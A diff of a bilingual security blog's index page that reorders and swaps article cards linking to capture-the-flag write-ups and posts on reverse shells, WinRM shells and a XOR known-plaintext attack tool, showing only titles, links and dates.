-      <i class="fa fa-calendar"></i>
-      <time lang="en">28 Oct 2017</time>
-      <time lang="el">28 Οκτ 2017</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/fluxcapacitor_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/capacitors.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">FluxCapacitor write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του FluxCapacitor</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">13 May 2018</time>
-      <time lang="el">13 Μαϊ 2018</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
             <article class="li col-sm-6 col-md-4">
   <a href="https://alamot.github.io/querier_writeup/" class="clearfix">
     <div class="cell">
@@ -1673,17 +1781,37 @@ or
            
            
            
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
             <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/reddish_writeup/" class="clearfix">
+  <a href="https://alamot.github.io/enterprise_writeup/" class="clearfix">
     <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/reddish.jpg);"></div>
+      <div class="image" style="background-image: url(https://alamot.github.io/images/space.jpg);"></div>
     </div>
     <footer>
-      <h3 class="title" lang="en">Reddish write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Reddish</h3>
+      <h3 class="title" lang="en">Enterprise write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Enterprise</h3>
       <i class="fa fa-calendar"></i>
-      <time lang="en">26 Jan 2019</time>
-      <time lang="el">26 Ιαν 2019</time>
+      <time lang="en">19 Mar 2018</time>
+      <time lang="el">19 Μαρ 2018</time>
     </footer>
   </a>
 </article>
@@ -1694,64 +1822,16 @@ or
            
            
             <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/fulcrum_writeup/" class="clearfix">
+  <a href="https://alamot.github.io/legacy_writeup/" class="clearfix">
     <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/fulcrum.jpg);"></div>
+      <div class="image" style="background-image: url(https://alamot.github.io/images/legacy.jpg);"></div>
     </div>
     <footer>
-      <h3 class="title" lang="en">Fulcrum write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Fulcrum</h3>
+      <h3 class="title" lang="en">Legacy write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Legacy</h3>
       <i class="fa fa-calendar"></i>
-      <time lang="en">09 Jun 2018</time>
-      <time lang="el">09 Ιουν 2018</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/falafel_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/falafel.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Falafel write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Falafel</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">23 Jun 2018</time>
-      <time lang="el">23 Ιουν 2018</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/unattended_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/unattended.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Unattended write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Unattended</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">23 Aug 2019</time>
-      <time lang="el">23 Αυγ 2019</time>
+      <time lang="en">19 Oct 2017</time>
+      <time lang="el">19 Οκτ 2017</time>
     </footer>
   </a>
 </article>
@@ -1777,357 +1857,23 @@ or
            
            
            
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
             <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/sense_writeup/" class="clearfix">
+  <a href="https://alamot.github.io/mantis_writeup/" class="clearfix">
     <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/pfsense.jpg);"></div>
+      <div class="image" style="background-image: url(https://alamot.github.io/images/mantis.jpg);"></div>
     </div>
     <footer>
-      <h3 class="title" lang="en">Sense write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Sense</h3>
+      <h3 class="title" lang="en">Mantis write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Mantis</h3>
       <i class="fa fa-calendar"></i>
-      <time lang="en">24 Mar 2018</time>
-      <time lang="el">24 Μαρ 2018</time>
+      <time lang="en">18 Feb 2018</time>
+      <time lang="el">18 Φεβ 2018</time>
     </footer>
   </a>
 </article>
 
            
           
-           
-           
-           
-          
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/reverse_shells/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/shell.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Reverse shells</h3>
-      <h3 class="title" lang="el">Αντίστροφα κελύφη (reverse shells)</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">12 Apr 2018</time>
-      <time lang="el">12 Απρ 2018</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/path_traversal_archiver/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/path.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Path-traversal archiver</h3>
-      <h3 class="title" lang="el">Αρχειοθέτης με διάσχιση διαδρομής</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">14 May 2019</time>
-      <time lang="el">14 Μαϊ 2019</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
           
            
            
@@ -2158,27 +1904,6 @@ or
            
            
            
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/winrm_shell/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/winrm.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">WinRM shell (a.k.a. PowerShell Remoting) with file upload capability</h3>
-      <h3 class="title" lang="el">WinRM κέλυφος (PowerShell Remoting) με δυνατότητα ανεβάσματος αρχείων</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">09 Apr 2018</time>
-      <time lang="el">09 Απρ 2018</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-           
           
            
            
@@ -2249,22 +1974,6 @@ or
            
            
            
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/xor_kpa/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/keylock.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Known-plaintext attack tool for XOR-encrypted data</h3>
-      <h3 class="title" lang="el">Εργαλείο επιθέσεων γνωστού αρχικού κειμένου έναντι XOR-κρυπτογραφημένων δεδομένων</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">22 Apr 2018</time>
-      <time lang="el">22 Απρ 2018</time>
-    </footer>
-  </a>
-</article>
-
-           
           
            
            
@@ -2326,25 +2035,9 @@ or
            
            
           
-           
            
            
            
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/oracle/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/oracle.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Ask and you shall receive</h3>
-      <h3 class="title" lang="el">Ζήτα και θα λάβεις</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">04 May 2019</time>
-      <time lang="el">04 Μαϊ 2019</time>
-    </footer>
-  </a>
-</article>
-
            
           
            
@@ -2507,6 +2200,239 @@ or
            
            
            
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/reverse_shells/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/shell.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Reverse shells</h3>
+      <h3 class="title" lang="el">Αντίστροφα κελύφη (reverse shells)</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">12 Apr 2018</time>
+      <time lang="el">12 Απρ 2018</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/path_traversal_archiver/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/path.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Path-traversal archiver</h3>
+      <h3 class="title" lang="el">Αρχειοθέτης με διάσχιση διαδρομής</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">14 May 2019</time>
+      <time lang="el">14 Μαϊ 2019</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/xor_kpa/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/keylock.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Known-plaintext attack tool for XOR-encrypted data</h3>
+      <h3 class="title" lang="el">Εργαλείο επιθέσεων γνωστού αρχικού κειμένου έναντι XOR-κρυπτογραφημένων δεδομένων</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">22 Apr 2018</time>
+      <time lang="el">22 Απρ 2018</time>
+    </footer>
+  </a>
+</article>
+
+           
           
            
            
@@ -2716,6 +2642,98 @@ or
            
            
            
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/oracle/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/oracle.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Ask and you shall receive</h3>
+      <h3 class="title" lang="el">Ζήτα και θα λάβεις</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">04 May 2019</time>
+      <time lang="el">04 Μαϊ 2019</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/winrm_shell/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/winrm.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">WinRM shell (a.k.a. PowerShell Remoting) with file upload capability</h3>
+      <h3 class="title" lang="el">WinRM κέλυφος (PowerShell Remoting) με δυνατότητα ανεβάσματος αρχείων</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">09 Apr 2018</time>
+      <time lang="el">09 Απρ 2018</time>
+    </footer>
+  </a>
+</article>
+
            
           
            
